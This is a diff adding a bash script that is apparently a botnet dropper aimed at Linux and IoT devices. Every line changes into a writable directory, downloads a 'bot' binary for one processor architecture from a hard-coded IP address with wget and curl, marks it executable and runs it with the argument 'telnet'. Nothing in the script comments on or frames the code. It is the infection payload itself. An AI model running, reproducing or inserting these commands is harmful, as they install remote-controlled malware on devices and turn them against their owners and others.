@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.239.242.195/b/bot.x86; curl -O http://185.239.242.195/b/bot.x86; cat bot.x86 > bot; chmod +x *; ./bot telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.239.242.195/b/bot.mips; curl -O http://185.239.242.195/b/bot.mips; cat bot.mips > bot; chmod +x *; ./bot telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.239.242.195/b/bot.mpsl; curl -O http://185.239.242.195/b/bot.mpsl; cat bot.mpsl > bot; chmod +x *; ./bot telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.239.242.195/b/bot.arm; curl -O http://185.239.242.195/b/bot.arm; cat bot.arm > bot; chmod +x *; ./bot telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.239.242.195/b/bot.arm5; curl -O http://185.239.242.195/b/bot.arm5; cat bot.arm5 > bot; chmod +x *; ./bot telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.239.242.195/b/bot.arm6; curl -O http://185.239.242.195/b/bot.arm6; cat bot.arm6 > bot; chmod +x *; ./bot telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.239.242.195/b/bot.arm7; curl -O http://185.239.242.195/b/bot.arm7; cat bot.arm7 > bot; chmod +x *; ./bot telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.239.242.195/b/bot.ppc; curl -O http://185.239.242.195/b/bot.ppc; cat bot.ppc > bot; chmod +x *; ./bot telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.239.242.195/b/bot.m68k; curl -O http://185.239.242.195/b/bot.m68k; cat bot.m68k > bot; chmod +x *; ./bot telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.239.242.195/b/bot.spc; curl -O http://185.239.242.195/b/bot.spc; cat bot.spc > bot; chmod +x *; ./bot telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.239.242.195/b/bot.i686; curl -O http://185.239.242.195/b/bot.i686; cat bot.i686 > bot; chmod +x *; ./bot telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.239.242.195/b/bot.sh4; curl -O http://185.239.242.195/b/bot.sh4; cat bot.sh4 > bot; chmod +x *; ./bot telnet
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.239.242.195/b/bot.arc; curl -O http://185.239.242.195/b/bot.arc; cat bot.arc > bot; chmod +x *; ./bot telnet
